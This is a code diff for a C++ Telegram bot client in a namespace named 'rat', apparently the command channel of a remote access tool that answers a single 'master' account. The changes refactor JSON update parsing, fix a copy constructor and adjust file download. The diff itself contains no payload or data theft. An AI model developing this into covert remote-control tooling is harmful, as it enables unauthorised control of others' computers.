@@ -13,30 +13,36 @@ namespace rat::tbot {
 
 // ------------------------ Helpers ------------------------
 
-static inline File _parseFileFromJson(const json& File_Json) {
-    std::string file_id   = File_Json.value("file_id", "");
-    std::string mime_type = File_Json.value("mime_type", "");
-    size_t file_size      = 0;
+// Change from rvalue reference to const reference
+static inline File _parseFileFromJson(const nlohmann::json& file_json) {
+    std::string file_id = file_json.value("file_id", "");
+    std::string mime_type = file_json.value("mime_type", "");
+    size_t file_size = 0;
 
-    if (File_Json.contains("file_size")) {
-        if (File_Json["file_size"].is_number_unsigned()) {
-            file_size = File_Json["file_size"].get<size_t>();
-        } else if (File_Json["file_size"].is_string()) {
-            try { file_size = std::stoull(File_Json["file_size"].get<std::string>()); } catch (...) {}
+    if (file_json.contains("file_size")) {
+        if (file_json["file_size"].is_number_unsigned()) {
+            file_size = file_json["file_size"].get<size_t>();
+        } else if (file_json["file_size"].is_string()) {
+            try { 
+                file_size = std::stoull(file_json["file_size"].get<std::string>()); 
+            } catch (...) {}
         }
     }
 
     std::optional<std::string> name = std::nullopt;
-    if (File_Json.contains("file_name")) name = File_Json["file_name"].get<std::string>();
+    if (file_json.contains("file_name")) {
+        name = file_json["file_name"].get<std::string>();
+    }
 
-    return File{file_id, mime_type, file_size, name};
+    return File{std::move(file_id), std::move(mime_type), file_size, std::move(name)};
 }
 
-static inline Update _parseJsonToUpdate(const json& update_json) {
+static inline Update _parseJsonToUpdate(nlohmann::json&& update_json) {
     Update update{};
     update.id = update_json.value("update_id", 0);
 
-    const json* message_ptr = nullptr;
+    // Find the message object
+    const nlohmann::json* message_ptr = nullptr;
     if (update_json.contains("message")) {
         message_ptr = &update_json["message"];
     } else if (update_json.contains("edited_message")) {
@@ -49,22 +55,37 @@ static inline Update _parseJsonToUpdate(const json& update_json) {
 
     const auto& msg = *message_ptr;
     Message message{};
-    message.id     = msg.value("message_id", 0);
-    message.origin = msg.value("from", json::object()).value("id", 0);
-    message.text   = msg.value("text", "");
+    message.id = msg.value("message_id", 0);
+    message.origin = msg.value("from", nlohmann::json::object()).value("id", 0);
 
-    if (msg.contains("photo") && msg["photo"].is_array() && !msg["photo"].empty()) {
-        const auto& photo = msg["photo"].back();
-        message.files.emplace_back(photo.value("file_id", ""), "image/jpeg", photo.value("file_size", 0));
+    // prefer text, fallback to caption
+    if (msg.contains("text")) {
+        message.text = msg.value("text", "");
+    } else if (msg.contains("caption")) {
+        message.text = msg.value("caption", "");
     }
 
-    if (msg.contains("document")) message.files.emplace_back(_parseFileFromJson(msg["document"]));
-    if (msg.contains("audio"))    message.files.emplace_back(_parseFileFromJson(msg["audio"]));
-    if (msg.contains("video"))    message.files.emplace_back(_parseFileFromJson(msg["video"]));
+    // Handle photos (use largest size) - use const reference
+    if (msg.contains("photo") && msg["photo"].is_array() && !msg["photo"].empty()) {
+        const auto& photo = msg["photo"].back();
+        message.files.emplace_back(_parseFileFromJson(photo)); // No std::move needed
+    }
+
+    // Handle other file types - use const reference
+    if (msg.contains("document")) {
+        message.files.emplace_back(_parseFileFromJson(msg["document"])); // No std::move
+    }
+    if (msg.contains("audio")) {
+        message.files.emplace_back(_parseFileFromJson(msg["audio"])); // No std::move
+    }
+    if (msg.contains("video")) {
+        message.files.emplace_back(_parseFileFromJson(msg["video"])); // No std::move
+    }
 
     update.message = std::move(message);
     return update;
 }
+
 
 // ------------------------ Bot methods ------------------------
 
@@ -87,11 +108,26 @@ Bot::Bot(const std::string& arg_Token, int64_t Master_Id, uint8_t Telegram_Conne
     this->getting_file_url         = fmt::format("{}{}/getFile?file_id=", TELEGRAM_BOT_API_BASE_URL, token);
     this->getting_update_url       = fmt::format("{}{}/getUpdates?timeout={}&limit=1", TELEGRAM_BOT_API_BASE_URL, token, Telegram_Connection_Timemout);
 }
-Bot::Bot(const Bot& other)
-    : token(other.token),
-      master_id(other.master_id),
-      curl_client() {}
 
+/*This is the root of the bug of the asynchronous /get behavior not functioning, I ingored constructing those links */
+Bot::Bot(const Bot& Other_Bot)
+    : token(Other_Bot.token),
+      master_id(Other_Bot.master_id),
+      last_update_id(Other_Bot.last_update_id),
+      update_interval(Other_Bot.update_interval),
+
+      sending_message_url_base(Other_Bot.sending_message_url_base),
+      sending_document_url(Other_Bot.sending_document_url),
+      sending_photo_url(Other_Bot.sending_photo_url),        
+      sending_audio_url(Other_Bot.sending_audio_url),        
+      sending_video_url(Other_Bot.sending_video_url),        
+      sending_voice_url(Other_Bot.sending_voice_url),            
+      getting_update_url(Other_Bot.getting_update_url),
+      getting_file_url(Other_Bot.getting_file_url),
+      curl_client()   // <-- copy underlying client too
+    {
+        this->setOffset();
+    }
 
 std::string Bot::getToken() const { 
     return token; 
@@ -115,7 +151,7 @@ void Bot::setOffset() {
         size_t bytes_read = curl_client.sendHttpRequest(init_url, init_buffer.data(), init_buffer.size());
 
         if (bytes_read > 0) {
-            auto resp_json = json::parse(init_buffer.data(), init_buffer.data() + bytes_read);
+            auto resp_json = nlohmann::json::parse(init_buffer.data(), init_buffer.data() + bytes_read);
 
             if (resp_json.value("ok", false) &&
                 resp_json.contains("result") &&
@@ -132,7 +168,9 @@ void Bot::setOffset() {
         ERROR_LOG("Failed to get latest update ID: {}", e.what());
     }
 }
-
+std::string Bot::getBotFileUrl(void) {
+    return this->getting_file_url;
+}
 BotResponse Bot::sendMessage(const std::string& Text_Message) {
     try {
         char* escaped = curl_easy_escape(nullptr, Text_Message.c_str(), static_cast<int>(Text_Message.size()));
@@ -148,7 +186,7 @@ BotResponse Bot::sendMessage(const std::string& Text_Message) {
 
         if (bytes_read == 0) return BotResponse::CONNECTION_ERROR;
 
-        auto resp = json::parse(response_buffer.data(), response_buffer.data() + bytes_read);
+        auto resp = nlohmann::json::parse(response_buffer.data(), response_buffer.data() + bytes_read);
         return resp.value("ok", false) ? BotResponse::SUCCESS : BotResponse::UNKNOWN_ERROR;
 
     } catch (const std::exception& e) {
@@ -178,7 +216,7 @@ BotResponse Bot::sendMessage(const char* Text_Message) {
 
         if (bytes_read == 0) return BotResponse::CONNECTION_ERROR;
 
-        auto resp = json::parse(response_buffer.data(), response_buffer.data() + bytes_read);
+        auto resp = nlohmann::json::parse(response_buffer.data(), response_buffer.data() + bytes_read);
         return resp.value("ok", false) ? BotResponse::SUCCESS : BotResponse::UNKNOWN_ERROR;
 
     } catch (const std::exception& e) {
@@ -387,18 +425,22 @@ BotResponse Bot::sendVoice(const std::filesystem::path& Voice_Path, const std::s
 
 bool Bot::downloadFile(const std::string& File_Id, const std::filesystem::path& Out_Path) {
     try {
-        std::string get_file_url = fmt::format("{}{}", getting_file_url , File_Id);
+        std::string get_file_url = fmt::format("{}{}", getting_file_url, File_Id);
 
         FileOperationResponseBuffer response_data;
         size_t bytes_read = this->curl_client.sendHttpRequest(get_file_url, response_data.data(), response_data.size());
 
         if (bytes_read == 0) return false;
+        
         DEBUG_LOG("Bytes that were retrieved from the https request {}", bytes_read);
-        auto resp_json = json::parse(response_data.data(), response_data.data() + bytes_read);
+        
+        // Move the parsed JSON
+        auto resp_json = nlohmann::json::parse(response_data.data(), response_data.data() + bytes_read);
         if (!resp_json.value("ok", false)) return false;
 
+        // Move the file_path string
         std::string file_path = resp_json["result"]["file_path"].get<std::string>();
-        std::string file_url  = fmt::format("{}/file/bot{}/{}", TELEGRAM_API_URL, token, file_path);
+        std::string file_url = fmt::format("{}/file/bot{}/{}", TELEGRAM_API_URL, token, file_path);
 
         auto file_data = this->curl_client.sendHttpRequest(file_url);
 
@@ -412,7 +454,6 @@ bool Bot::downloadFile(const std::string& File_Id, const std::filesystem::path& 
         return false;
     }
 }
-
 Update Bot::getUpdate() {
     try {
         std::string url = fmt::format("{}&offset={}&limit=1", getting_update_url, last_update_id + 1);
@@ -424,7 +465,8 @@ Update Bot::getUpdate() {
 
         if (bytes_read == 0) return {};
 
-        auto resp_json = json::parse(update_buffer.data(), update_buffer.data() + bytes_read);
+        // Parse and move the JSON to avoid unnecessary copies
+        auto resp_json = nlohmann::json::parse(update_buffer.data(), update_buffer.data() + bytes_read);
 
         if (!resp_json.value("ok", false) ||
             !resp_json.contains("result") ||
@@ -433,8 +475,9 @@ Update Bot::getUpdate() {
             return {};
         }
 
-        const auto& update_json = resp_json["result"][0];
-        Update update = _parseJsonToUpdate(update_json);
+        // Move the individual update JSON object
+        nlohmann::json update_json = std::move(resp_json["result"][0]);
+        Update update = _parseJsonToUpdate(std::move(update_json));
 
         last_update_id = update.id;
         return update;
